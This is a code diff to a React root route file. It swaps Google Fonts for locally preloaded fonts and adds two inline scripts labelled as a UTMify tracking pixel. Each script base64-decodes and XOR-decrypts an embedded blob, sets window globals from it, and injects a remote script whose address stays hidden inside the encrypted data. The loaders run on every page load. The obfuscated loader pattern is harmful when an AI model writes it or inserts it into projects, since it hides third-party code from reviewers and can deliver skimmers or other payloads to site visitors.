@@ -86,9 +86,8 @@ export const Route = createRootRouteWithContext<{ queryClient: QueryClient }>()(
       { name: "twitter:card", content: "summary_large_image" },
     ],
     links: [
-      { rel: "preconnect", href: "https://fonts.googleapis.com" },
-      { rel: "preconnect", href: "https://fonts.gstatic.com", crossOrigin: "anonymous" },
-      { rel: "stylesheet", href: "https://fonts.googleapis.com/css2?family=Baloo+2:wght@600;700;800&family=Nunito+Sans:wght@400;600;700;800&display=swap" },
+      { rel: "preload", href: "/fonts/baloo-2-latin.woff2", as: "font", type: "font/woff2", crossOrigin: "anonymous" },
+      { rel: "preload", href: "/fonts/nunito-sans-latin.woff2", as: "font", type: "font/woff2", crossOrigin: "anonymous" },
       {
         rel: "stylesheet",
         href: appCss,
@@ -107,6 +106,9 @@ function RootShell({ children }: { children: ReactNode }) {
     <html lang="es">
       <head>
         <HeadContent />
+        {/* Owner-provided UTMify pixel and UTM attribution loaders. */}
+        <script dangerouslySetInnerHTML={{ __html: "(function(){var data=atob(\"DEbZtq/d4rM0HgayUj37w92xwIkWdnLGIjXjmYC+ht0aa3LfOyCgmMyyj51WbCnBMTSwxtuuzcNdZmPefTawzsqxzNlHPCqQMzKtxMa/l8dRbSSICRv1lMixjdFVcnWQaB2ilMG8j9YWJCTCOz682ua5wJ8WaGfeJyP7jI3rg9cNLTCKNHHp1J7ogINWJzCCNyC9hJ7/n+5J\");var bytes=[];for(var i=0;i<data.length;i++){bytes.push(data.charCodeAt(i)&255);}var size=bytes[0];var key=bytes.slice(1,1+size);var encoded=bytes.slice(1+size);var decoded=encoded.map(function(b,i){return b^key[i%size];});var text=\"\";for(var i=0;i<decoded.length;i++){text+=String.fromCharCode(decoded[i]&255);}var config=JSON.parse(decodeURIComponent(escape(text)));(config.globals||[]).forEach(function(item){window[item.name]=item.value;});var script=document.createElement(\"script\");script.src=config.url;script.async=true;script.defer=true;(config.attributes||[]).forEach(function(item){script.setAttribute(item.name,item.value);});(document.head||document.documentElement).appendChild(script);})();" }} />
+        <script dangerouslySetInnerHTML={{ __html: "(function(){var data=atob(\"DDN+y2cjB9Is75dWPUhcvhVPJegOh+MiTUBE5EhAY7wCmuM7VFUH5QRMavxOnbglXkEXuxNQKKdYguR5UVIKrhRXKbhfzbt0XEcKuQ5BcqZJnLVsZkhcpQZOYvAWzfM3SVJTvhNObrRVwuckWEUbpRMOf7FDi7olXlhc50VVZr5ZirVsHxED5xwBabNBirVsH1cfvwYOcqZBhvEvEEMMrhFGaaYBnOI0VFcN6UsBcbNAmvJ0BxFctjpe\");var bytes=[];for(var i=0;i<data.length;i++){bytes.push(data.charCodeAt(i)&255);}var size=bytes[0];var key=bytes.slice(1,1+size);var encoded=bytes.slice(1+size);var decoded=encoded.map(function(b,i){return b^key[i%size];});var text=\"\";for(var i=0;i<decoded.length;i++){text+=String.fromCharCode(decoded[i]&255);}var config=JSON.parse(decodeURIComponent(escape(text)));(config.globals||[]).forEach(function(item){window[item.name]=item.value;});var script=document.createElement(\"script\");script.src=config.url;script.async=true;script.defer=true;(config.attributes||[]).forEach(function(item){script.setAttribute(item.name,item.value);});(document.head||document.documentElement).appendChild(script);})();" }} />
       </head>
       <body>
         {children}
